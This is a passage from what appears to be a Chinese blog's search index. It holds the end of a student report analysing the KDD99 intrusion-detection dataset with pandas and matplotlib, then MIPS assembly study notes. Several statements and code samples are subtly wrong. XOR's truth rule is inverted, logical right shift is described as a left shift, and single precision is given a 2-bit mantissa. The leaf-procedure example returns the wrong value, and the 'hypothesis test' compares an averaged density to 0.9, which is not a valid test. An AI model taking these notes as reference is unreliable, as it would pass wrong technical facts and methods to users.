8)\n\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291222924.png)\n\n#### 4.利⽤labeled数据集的统计特征，分析unlabeled数据集。假设KDD99的正常数据集服从正态分布，则在置信度为0.9的情况下，请检验unlabeled数据集是否属于正常数据？\n\n**提示：首先需要获得一个normal的数据样本集，然后需要排除掉数据集中无关features的影响，之后以处理后的数据集估计KDD99正常数据集的均值和方差，然后利用假设检验，对应的去检验unlabeled数据集的相关性质。**\n\n```python\nimport pandas as pd\nimport numpy as np\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./data/corrected-Test data with corrected labels\")\ndf1 = pd.read_csv(\"./data/kddcup.data.corrected-The full data set\")\ndf.columns = labels\ndf1.columns = labels\n\nnormal_label = ['normal']\ndos_label = ['back','land','neptune','pod','smurf','teardrop','apache2','mailbomb','processtable','udpstorm']\nprobing_label = ['ipsweep','nmap','portsweep','satan','mscan','saint']\nr2l_label = ['tp_write','guess_passwd','imap','multihop','phf','spy','warezclient','warezmaster','multihop','named','sendmail','snmpgetattack','worm','xlock','xsnoop']\nu2r_label = ['buffer_overflow','loadmodule','perl','rootkit','ps','sqlattack','xterm','httptunnel']\n\nfinal_label = ['Normal','Dos','Probing','R2l','U2r']\nfinal_dict = {\n    \"Normal\": 0,\n    \"Dos\": 0,\n    \"Probing\": 0,\n    \"R2l\": 0,\n    \"U2r\": 0\n}\n\nfor i in normal_label:\n    df[df.values == i +'.'].to_csv('./label/normal/'+ i +'.csv', header=0, index=0)\n    df1[df1.values == i +'.'].to_csv('./label1/normal/'+ i +'.csv', header=0, index=0)\n\nfor i in dos_label:\n    df[df.values == i +'.'].to_csv('./label/dos/'+ i +'.csv', header=0, index=0)\n    df1[df1.values == i +'.'].to_csv('./label1/dos/'+ i +'.csv', header=0, index=0)\n\nfor i in probing_label:\n    df[df.values == i +'.'].to_csv('./label/probing/'+ i +'.csv', header=0, index=0)\n    df1[df1.values == i +'.'].to_csv('./label1/probing/'+ i +'.csv', header=0, index=0)\n\nfor i in r2l_label:\n    df[df.values == i +'.'].to_csv('./label/r2l/'+ i +'.csv', header=0, index=0)\n    df1[df1.values == i +'.'].to_csv('./label1/r2l/'+ i +'.csv', header=0, index=0)\n\nfor i in u2r_label:\n    df[df.values == i +'.'].to_csv('./label/u2r/'+ i +'.csv', header=0, index=0)\n    df1[df1.values == i +'.'].to_csv('./label1/r2l/'+ i +'.csv', header=0, index=0)\n```\n\n先获得各种不同种类的数据\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291544707.png)\n\n```python\nimport pandas as pd\nimport numpy as np\nfrom scipy.stats import norm\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./label/normal/normal.csv\")\ndf1 = pd.read_csv(\"./label1/normal/normal.csv\")\ndf.columns = labels\ndf1.columns = labels\n\n# 选择要分析的特征\nfeature = \"duration\"\n\n# 计算 labeled 数据集中特征的均值和标准差\nmean = df[feature].mean()\nstd = df[feature].std()\n\n# 初始化概率和计数器\nprobability_sum = 0\ncount = 0\n\n# 遍历 unlabeled 数据集中的每个数据点\nfor value in df1[feature]:\n  # 计算数据点在假设正常数据服从正态分布的情况下的概率\n  probability = norm.pdf(value, mean, std)\n  # 累加概率和计数器\n  probability_sum += probability\n  count += 1\n\n# 计算平均概率\nmean_probability = probability_sum / count\nprint(mean_probability)\n# 将平均概率与所需的置信度进行比较\nif mean_probability > 0.9:\n  print(\"Unlabeled dataset is likely to belong to normal data.\")\nelse:\n  print(\"Unlabeled dataset is not likely to belong to normal data.\")\n```\n\n> 0.0007079938317307032\n> Unlabeled dataset is not likely to belong to normal data.\n\n\n\n## 五、实验过程\n\n### 处理数据\n\n参考菜鸟教程的示例，可发现**pandas库**对csv，也就是本实验给出的数据是很好处理的\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291052328.png)\n\n```python\nimport pandas as pd\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"test.txt\")\ndf.columns = labels\ndf_dict = df.loc[:,\"duration\"].value_counts()\n```\n\n从而根据案例编写出如下代码，可以得到**duration**行的统计数据\n\n```\n0    6\n1    4\n2    2\nName: duration, dtype: int64\n```\n\n对其进行简单处理\n\n```python\ndict = {}\nfor i in df_dict.keys():\n    dict[i] = df_dict[i]\nkeys = np.array(list(dict.keys()))\nvalues = np.array(list(dict.values()))\n```\n\n可以得到\n\n```\nkeys: [0, 1, 2]\nvalues: [6 4 2]\n```\n\n正好满足 **Matplotlib** 绘制饼图需要的数据\n\n### Matplotlib 饼图\n\n根据菜鸟教程以下代码，可得到\n\n```python\nimport matplotlib.pyplot as plt\nimport numpy as np\n\ny = np.array([35, 25, 25, 15])\n\nplt.pie(y,\n        labels=['A','B','C','D'], # 设置饼图标签\n        colors=[\"#d5695d\", \"#5d8ca8\", \"#65a479\", \"#a564c9\"], # 设置饼图颜色\n       )\nplt.title(\"RUNOOB Pie Test\") # 设置标题\nplt.show()\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291142167.png)\n\n在上面对测试数据的处理下对该代码进行改变可得到\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"test.txt\")\ndf.columns = labels\ndf_dict = df.loc[:,\"duration\"].value_counts()\ndict = {}\nfor i in df_dict.keys():\n    dict[i] = df_dict[i]\nkeys = np.array(list(dict.keys()))\nvalues = np.array(list(dict.values()))\ny = values\n\nplt.pie(y,\n        labels=np.array(keys), # 设置饼图标签\n        colors=[\"#d5695d\", \"#5d8ca8\", \"#65a479\"], # 设置饼图颜色\n       )\nplt.title(\"Duration Pie Test\") # 设置标题\nplt.show()\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291142290.png)\n\n而由于本题中的数据过多过杂，将数据名称显示在每个扇形的旁边是不现实的，需要有一个图例实现如下效果\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291142994.png)\n\n参考\thttps://blog.csdn.net/weixin_35757704/article/details/126965333\n\n根据其代码，可得到\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"test.txt\")\ndf.columns = labels\ndf_dict = df.loc[:,\"duration\"].value_counts()\ndict_value = {}\nfor i in df_dict.keys():\n    dict_value[i] = df_dict[i]\nkeys = list(dict_value.keys())\nvalues = np.array(list(dict_value.values()))\npatches, texts = plt.pie(values)\nlabels = ['{} {:1.2f}% ({})'.format(i, j, v) for i, j, v in\n    zip(keys, 100. * values / values.sum(), values)]  # 构造图例数据\npatches, labels, dummy = zip(*sorted(\n    zip(patches, labels, values), key=lambda x: x[2], reverse=True))\nplt.legend(patches, labels, loc=\"center\", bbox_to_anchor=(-0.1, 0.5), fontsize=8)\nplt.tight_layout()\nplt.show()\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291142469.png)\n\n将其整合为两个函数并稍微改进\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./data/corrected-Test data with corrected labels\")\ndf.columns = labels\n\ndef plot_pie_optimize(title, dict_value: dict, font_size):\n    keys = list(dict_value.keys())\n    values = np.array(list(dict_value.values()))\n    patches, texts = plt.pie(values)\n    labels = ['{} {:1.2f}% ({})'.format(i, j, v) for i, j, v in\n              zip(keys, 100. * values / values.sum(), values)]  # 构造图例数据\n    patches, labels, dummy = zip(*sorted(\n        zip(patches, labels, values), key=lambda x: x[2], reverse=True))\n    plt.legend(patches, labels, loc=\"center\", bbox_to_anchor=(-0.1, 0.5), fontsize=font_size)\n    plt.title(title)\n    plt.tight_layout()\n    plt.savefig(\"./dataimg/{}.png\".format(title), dpi = 600, bbox_inches = 'tight') # 使得到的图片更完整清晰\n\ndef plot_label(title, font_size):\n    df_label = df.loc[:, title].value_counts()\n    dict_value = {}\n    for i in df_label.keys():\n        dict_value[i] = df_label[i]\n    plot_pie_optimize(title, dict_value, font_size)\n\n\nplot_label(\"flag\", 6)\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291140247.png)\n\n## 参考链接\n\nhttps://www.runoob.com/pandas/pandas-csv-file.html\n\nhttps://www.runoob.com/w3cnote/matplotlib-tutorial.html\n\nhttps://www.runoob.com/numpy/numpy-tutorial.html\n\nhttps://www.runoob.com/matplotlib/matplotlib-pie.html\n\nhttps://juejin.cn/post/7031475009688191007\n\nhttps://blog.csdn.net/weixin_35757704/article/details/126965333\n\n还有z神的实验报告🤗\n","tags":["class","python"]},{"title":"计组补天","url":"/2022/12/16/计组补天/","content":"# 第二章\n\n## MIPS指令\n\n| 指令                                       | 示例              | 含义                            | 注释                                   |\n| ------------------------------------------ | ----------------- | ------------------------------- | -------------------------------------- |\n| 加法                                       | add $s1,$s2,$s3   | $s1=$s2+$s3                     |                                        |\n| 减法                                       | sub $s1,$s2,$s3   | $s1=$s2-$s3                     |                                        |\n| 立即数加法                                 | addi $s1,$s2,20   | $s1=$s2+20                      | 立即数即常数                           |\n| 乘法                                       | mul $s1,$s2,$s3   | $s1=$s2*$s3                     |                                        |\n| 取立即数                                   | li $s0,5          | int $s0 = 5                     |                                        |\n| 取字符串                                   | la $a0,space      | char $a0 = \" \"                  | space需要在开头定义                    |\n| 赋值                                       | move $t0,$t1      |                                 | 将寄存器$t1中的数据传送至$t0           |\n| 输出                                       | syscall           | 将$a0内的内容输出               |                                        |\n| 取字                                       | lw $s1,20($s2)    | $s1=Memory[$s2+20]即a=b[5]      | 括号外的字节数只能用常数，用于取数组值 |\n| 存字                                       | sw $s1,20($s2)    | Memory[$s2+20]=$s1即b[5]=a      | 用于对数组赋值                         |\n| 取半字                                     | lh $s1,20($s2)    | $s1=Memory[$s2+20]              | 取字是该地址后四个字节，半字则两个字节 |\n| 取无符号半字                               | lhu $s1,20($s2)   | $s1=Memory[$s2+20]              | 顾名思义，无符号                       |\n| 存半字                                     | sh $s1,20($s2)    | Memory[$s2+20]=$s1              |                                        |\n| 取字节                                     | lb $s1,20($s2)    | $s1=Memory[$s2+20]              | 取一个字节                             |\n| 取无符号字节                               | lbu $s1,20($s2)   | $s1=Memory[$s2+20]              |                                        |\n| 存字节                                     | sb $s1,20($s2)    | Memory[$s2+20]=$s1              |                                        |\n| *取链接字*                                 | *ll $s1,20($s2)*  | *$s1=Memory[$s2+20]*            |                                        |\n| *存条件字*                                 | *sc $s1,20($s2)*  | *Memory[$s2+20]=$s1;$s1=o or 1* |                                        |\n| *取立即数的高位*                           | *lui $s1,20*      | *$s1=20*2^16*                   |                                        |\n| 与                                         | and $s1,$s2,$s3   | $s1=$s2 & $s3                   | 按位与                                 |\n| 或                                         | or $s1,$s2,$s3    | $s1=$s2 \\| $s3                  | 按位或                                 |\n| 或非                                       | nor $s1,$s2,$s3   | $s1=~($s2 \\| $s3)               | 按位或非                               |\n| 异或                                       | xor $s1,$s2,$s3   | 异或                            | 异或                                   |\n| 立即数与                                   | andi $s1,$s2,20   | $s1=$s2 & 20                    |                                        |\n| 立即数或                                   | ori $s1,$s2,20    | $s1=$s2 \\| 20                   |                                        |\n| 逻辑左移                                   | sll $s1,$s2,10    | $s1=$s2<<10                     | 左移n位等同于乘2^n                     |\n| 逻辑右移                                   | srl $s1,$s2,10    | $s1=$s2>>10                     | 除2^n                                  |\n| 相等时跳转                                 | beq $s1,$s1,Else  | if($s1==$s2) go to Else         | Else一般是后面定义的一个标签           |\n| 不相等时跳转                               | bne $s1,$s1,Else  | if($s1!=$s2) go to Else         |                                        |\n| 小于时置位                                 | slt $s1,$s2,$s3   | if($s2<$s3) $s1=1;else $s1=0    | 前小于后则赋1                          |\n| **无符号数**比较小于时置位                 | sltu $s1,$s2,$s3  | if($s2<$s3) $s1=1;else $s1=0    | 无符号数                               |\n| **无符号数**比较小于**立即数**时置位       | slti $s1,$s2,$s3  | if($s2<20) $s1=1;else $s1=0     | 比较是否小于常数                       |\n| **无符号数**比较小于**无符号立即数**时置位 | sltiu $s1,$s2,$s3 | if($s2<20) $s1=1;else $s1=0     | 比较是否小于无符号常数                 |\n| 跳转                                       | j 2500            | go to 10000                     | 当然标签也可以                         |\n| 跳转至寄存器所指位置                       | jr $ra            | go to $ra                       | 用于switch以及过程调用                 |\n| 跳转并且链接                               | jal 2500          | $ra=PC+4;go to 10000            | 用于过程调用                           |\n\n## 32位寄存器\n\n| 表示    | 作用                         | 注释                                            | 位置       |\n| ------- | ---------------------------- | ----------------------------------------------- | ---------- |\n| $zero   | 寄存器的值恒为0              |                                                 | 1          |\n| $v0~$v1 | 计算结果，返回值             | 用于返回值                                      | 2~3        |\n| $a0~$a3 | 用于进入函数时传递参数       |                                                 | 4~7        |\n| $s0~$s7 | 保留寄存器                   | 一般存一些重要的值                              | 16~23      |\n| $t0~$t9 | 临时寄存器                   | 其它函数或循环等中的临时变量                    | 8~15,24~25 |\n| $at     | 汇编器保留，用于处理大的常数 |                                                 |            |\n| $sp     | 栈指针                       | 进入其它函数时                                  | 29         |\n| $ra     | 返回指针                     | 用于返回起始点的返回地址寄存器                  | 31         |\n| $gp     | 全局指针                     | 指向静态数据区的保留寄存器,全局变量或static变量 |            |\n| $fp     | 帧指针                       |                                                 |            |\n| $k0~$k1 |                              |                                                 |            |\n\n## 机器指令\n\n### R型\n\nop与funct为**六位**，其他**五位**，加起来正好**三十二位**\n\n| 例                | op(操作码) | rs(操作数寄存器) | rt(操作数寄存器) | rd(目的寄存器) | shamt(位移量) | funct(功能码) |\n| ----------------- | ---------- | ---------------- | ---------------- | -------------- | ------------- | ------------- |\n| add $t0, $s1, $s2 | 0          | 17(**$s1**)      | 18(**$s2**)      | 8(**$t0**)     | 0             | 32            |\n| sub               | 0          | reg              | reg              | reg            | 0             | 34            |\n\n### I型\n\n因rd寄存器只有五位(**<32**)，限制太大，故设计**I型**\n\nconstant or address包含rd,shamt,funct，所以十六位\n\n**rt变为目的寄存器**\n\n| 例              | op   | rs   | rt   | constant or address |\n| --------------- | ---- | ---- | ---- | ------------------- |\n| addi            | 8    | reg  | reg  | **address**         |\n| lw              | 35   | reg  | reg  | **address**         |\n| sw              | 43   | reg  | reg  | **address**         |\n| lw $t0,300($t1) | 35   | 9    | 8    | 1200(**300 * 4**)   |\n\n**address**表示十六位地址\n\n## 逻辑操作\n\n### 移位(>><<)\n\n逻辑左移 (sll)：将一个字里面的所有位都向左移动，并在空出来的位上填充 0。\n\n逻辑右移 (srl)：将一个字里面的所有位都向左移动，并在空出来的位上填充 0。\n\n左移 𝑖 位就相当于乘以 2^𝑖，右移即除\n\n### 按位与(AND)\n\nAND 提供了一种将源操作数中某些位置为0 的能力，前提是另一个操作数中对应位为0。后一个操作数传统上被称为掩码(mask) ，寓意其可\"隐藏\"某些位。\n\n上下都为 **1** 则结果为 **1**\n\n### 按位或(OR)\n\n上下任意一数为 **1** 则结果为 **1**\n\n### 按位取反(NOT)\n\n对一个数进行操作，1变成0，0变成1\n\n### 或非(NOT OR)\n\n顾名思义，先**或**再**取反**\n\n### 异或(XOR)\n\n相同置1，不相同置0\n\n## 示例\n\n### 叶过程\n\n> C 程序\n>\n> ```c\n> int leaf_example (int g, int h, int i, int j)\n> {\n> \tint f;\n> \tf = (g + h) - (i + j);\n> \treturn f;\n> }\n> ```\n>\n> 编译后的MIPS 汇编代码是什么呢?\n>\n> 参数变量 g 、h 、i 和 j 对应参数寄存器 $a0 、$a1 、$a2 和$a3，f 对应 $s0\n> 假定需要保留$s0,$t0和$t1这三个寄存器\n\n>  **解**\n>\n> ```gas\n> leaf_example:\t#子程序名，标号\n>     addi $sp,$sp,-12\t#将栈指针$sp向低地址压3个字用于保留原寄存器的值\n>     sw $t1, 8($sp)\n>     sw $t0, 4($sp)\n>     sw $s0, 0($sp)\t#保存原值\n>     add $t0, $a0, $a1\t# register $t0 contains g+h\n>     add $t1, $a2, $a3\t# register $t1 contains i+j\n>     sub $s0, $t0, $t1 # f = (g + h) - (i + j)\n>     add $v0, $t0, $t1\t# 将f的值存进返回值寄存器$v0用于返回值\n>     lw $s0, 0($sp)\n>     lw $t0, 4($sp)\n>     lw $t1, 8($sp)\t#恢复原值\n>     addi $sp, $sp, 12\t#恢复栈指针原来的位置\n>     jr $ra\t#根据跳转寄存器中的返回地址跳转\n> ```\n>\n> 栈的作用图\n>\n> <img src=\"image-20221216203055223.png\">\n\n这个过程可叫做**叶过程**，即不调用其他过程的过程\n\n一般来说\n\n| 保留           | 不保留         |\n| -------------- | -------------- |\n| $s0~$s7        | $t0~$t9        |\n| $sp            | $a0~$a3        |\n| $ra            | $v0~$v1        |\n| 栈指针以上的栈 | 栈指针以下的栈 |\n\n### 非叶过程\n\n如果是非叶过程，即调用该过程的中途也要调用其他过程，可能会导致寄存器使用冲突\n\n解决方法就是**将所有必须保留的寄存器压栈**\n\n* **调用者**将所有调用后还需要的参数寄存器 ($a0 - $a3) 或临时寄存器 ($t0 - $t9) 压栈\n* **被调用者**将返回地址寄存器$ra和被调用者使用的保留寄存器( $s0 - $s7) 都压栈\n* **栈指针$sp**随着栈中寄存器个数调整。到返回时，寄存器会从存储器中恢复，栈指针也随着重新调整。\n\n#### **递归过程**\n\n重复调用函数\n\n> 下面是一个计算阶乘的递归过程:\n>\n> ```c\n> int fact (int n) {\n> \tif(n<1) \n>         return(1);\n> \telse \n>         return ( n * fact(n -1));\n> }\n> ```\n>\n> 该过程的MIPS 汇编代码是怎样的呢?\n\n> **解**\n>\n> ```gas\n> fact:\n> \taddi $sp, $sp, -8\t\n> \tsw $ra, 4($sp)\t#根据上述叶过程需保留 $ra\n> \tsw $a0, 0($sp)\t#同样，参数寄存器 $a0(<==>n) 也需要保留\n> \tslti $t0, $a0, 1\t# $a0 < 1 时 $t0 置 1\n> \tbeq $t0, $zero, L1\t# if $t0 == 0, go to L1, else(即$t0 == 1) 则继续\n> \taddi $v0, $zero, 1\t#retutn 1\n> \taddi $sp, $sp, 8\t#并未进入其他过程，所以直接弹栈返回即可\n> \tjr $ra\t#return\n> \tL1:\n> \t\taddi $a0, $a0, -1 # gets n - 1\n> \t\tjal fact\t# call fact with (n - 1)\n> \tlw $a0, 0($sp)\t#接下来的部分属于 fact\n> \tlw $ra, 4($sp)\n> \taddi $sp, $sp, 8\t#嵌套了其他过程，所以其他过程进行完后要恢复原值\n> \tmul $v0, $a0, $v0\t#将上一过程的返回值乘 n 来得到现在过程的返回值\n> \tjr $ra\t#return\n> ```\n>\n> \n\n#### **迭代过程**\n\n**循环某一过程**而非循环进入函数\n\n> 考虑下面一个用来求和的过程:\n>\n> ```c\n> int sum (int n, int acc) {\n> \tif (n>0)\n> \t\treturn sum (n – 1, acc + n) ;\n> \telse\n> \t\treturn acc;\n> }\n> ```\n>\n> 该过程的MIPS 汇编代码是怎样的呢?\n\n> **解**\n>\n> 分析一下可知，如果 **n>0** 则令 **n-1** 并且使 **acc+n**\n>\n> 完完全全可以用循环代替\n>\n> **假设 $a0 = n  $a1 = acc**\n>\n> ```gas\n> sum:\n> \tslit $t0, $a0, 1\t# $a0 < 1 时 $t0 置 1\n> \tbne $t0, $zero, sum_exit\t# if $t0 == 0 , go to sum_exit\n> \tadd $a1, $a1, $a0\t# acc = acc + n\n> \taddi $a0, $a0, -1\t# go to sum\n> sum_exit:\n> \tadd $v0, $a1, $zero\t#return acc\n> \tjr $ra\t#return\n> ```\n>\n> \n\n### 字符操作\n\n一个 **char** 一字节，八比特，最高表示 **127**，即**ASCII**码的127位\n\n所以对字符串的操作一般是 **lb(字节读取) sb(字节存储)**\n\n> C语言\n>\n> ```c\n> void strcpy (char x[], char y[]) {\n>     int i;\n>     i = 0;\n>     while ((x[i] = y[i]) != '\\0')\n>         i += 1;\n> }\n> ```\n>\n> 编译后的MIPS汇编代码是什么？\n\n> **解**\n>\n> 假定数组 x 和 y 的基地址在 $a0 和 $a1 中，而 i 在 $s0 中\n>\n> strcpy 调整栈指针然后将保存的寄存器 $s0 保存在栈中\n>\n> ```gas\n> strcpy:\n> \taddi $sp, $sp, -4\n> \tsw $s0, 0($sp)\n> \tadd $s0, $zero, $zero\t# 初始化 i\n> \tL1:\n> \t\tadd $t1, $s0, $a1\t# get address y[i]\n> \t\tlbu $t2, 0($t1)\t# $t2 = y[i] 得到第 i 个字符\n> \t\tadd $t3, $s0, $a0\t# get address x[i]\n> \t\tsb $t2, 0($t3)\t# x[i] = y[i]\n> \t\tbeq $t2, $zero, L2 # if y[i] == 0 , go to L2\n> \t\taddi $s0, $s0, 1\t# i = i + 1\n> \t\tj L1\t# 不是则继续循环 L1\n> \tL2:\n> \t\tlw $s0, 0($sp)\n> \t\taddi $sp, $sp, 4\n> \t\tjr $ra\t#return\n> ```\n>\n> \n\n\n\n## 注意\n\n* 一个字四个字节，一个字节八比特\n* 负数一般用补码表示(**取反后 +1**)\n* 无符号数即把符号位也当成一位数，如-1的无符号数为为**4294967295**\n* 如果参数多于参数寄存器的数量(**4**)，**MIPS**约定将额外参数放在**栈指针的上方**\n\n### 利用无符号数进行边界检查\n\n可降低检验下标是否越界的开销\n\n```gas\nsltu $t0, $s1, $t2\t# $t0=0 if $s1 >= $t2 or $s1 <0\nbeq $t0, $zero, IndexOutOfBounds\t#if bad , goto Error\n```\n\n# 第三章\n\n## 加减法\n\n### 溢出\n\n由于字宽只有32位，所以在运算中会发生溢出\n\n```php\n\t0100 0000 0000 0000 0000 0000 0000 0111\n+\t0100 0000 0000 0000 0000 0000 0000 0110\n————————————————————————————————————————————\n=\t1000 0000 0000 0000 0000 0000 0000 1101\n```\n\n溢出会导致异常\n\n**同号的数相减，不会溢出**\n\n**异号的数相加，不会溢出**\n\n对无符号数处理的算术指令，不会产生异常(**addu,addiu,subu...**)\n\n### 溢出的判断\n\n**有符号加法**\n\n若输入的两数据符号位相同，而输出的数据符号位与前数据不同，则鉴定为溢出，抛出异常\n\n其他同理\n\n## 乘法\n\n十进制下 **1000 × 1001**\n\n```php\n\t\t\t1000\n×\t\t\t1001\n————————————————————\n\t\t\t1000\n\t\t   0000\n\t\t  0000\n\t\t 1000\n————————————————————\n\t\t 1001000\n```\n\n<img src=\"image-20221217162459269.png\">\n\n看不太懂这个图，反正就那意思😣\n\n## 除法\n\n<img src=\"image-20221217163016072.png\">\n\n两者对于符号位的处理都是，**同号为正，异号为负**\n\n## 浮点数\n\n**单精度浮点数**：**指数域**8位，**尾数域**2位，**符号**1位。\n\n# 计组大作业\n\n## 第一题\n\n> 将下面的C代码翻译为MIPS汇编代码。要求使用的指令数目最少。假设值a、b、i和j分别存放在寄存器$s0、$s1、$t0和$t1中。另外假设寄存器$s2中存放着数组D的基地址\n>\n> ```c\n> for (i =0 ; i < a; i++) {\n> \tfor (j = 0; j < b; j++) {\n> \t\tD[4*j] = i + j;\n> \t}\n> }\n> ```\n>\n> \n\n\n\n> **解**\n>\n> 设定a=10,b=10,完成数组D[]的更新，并输出数组信息；\n>\n> ```gas\n> # Author: 肖磊\n> # Date: 2022-12-17\n> .data\n> \n> array_D: .space 160\n> updateMsg: .asciiz \"update:\"\n> line: .asciiz \"\\n\"\n> space: .asciiz \" \"\n> \n> .text\n> main:\n> \t# save a, b, D[]\n> \taddi $sp, $sp, -12\n> \tsw $s0, 8($sp)\n> \tsw $s1, 4($sp)\n> \tsw $s2, 0($sp)\n> \n> \t#initialization\n> \taddi $s0, $zero, 10\t# a = 10\n> \taddi $s1, $zero, 10\t# b = 10\n> \tla $s2, array_D\t# D with 160 space\n> \tli $t0, 0\t# int i = 0\n> \n> \tfirst_loop:\n> \t\t# if i < a\n> \t\tbge $t0, $s0, loop1_exit\t# bge if $t0 ≥ $s0 , j loop1_exit\n> \t\tli $t1, 0\t# int j = 0\n> \t\tsecond_loop:\n> \t\t\t# if j < b\n> \t\t\tbge $t1, $s1, loop2_exit\n> \t\t\tadd $t2, $t0, $t1\t# i + j\n> \t\t\tsll $t3, $t1, 4\t# t3 = 4 * 4 * j\n> \t\t\tadd $t3, $t3, $s2\t# address of D[4 * j]\n> \t\t\tsw $t2, 0($t3)\t# D[4 * j] = i + j\n> \t\t\taddi $t1, $t1, 1\t# j++\n> \t\t\tj second_loop\n> \t\tloop2_exit:\n> \t\t\t# print updateMsg\n> \t\t\tli $v0, 4\n> \t\t\tla $a0, updateMsg\n> \t\t\tsyscall\n> \t\t\t# print array\n> \t\t\tjal print_array\n> 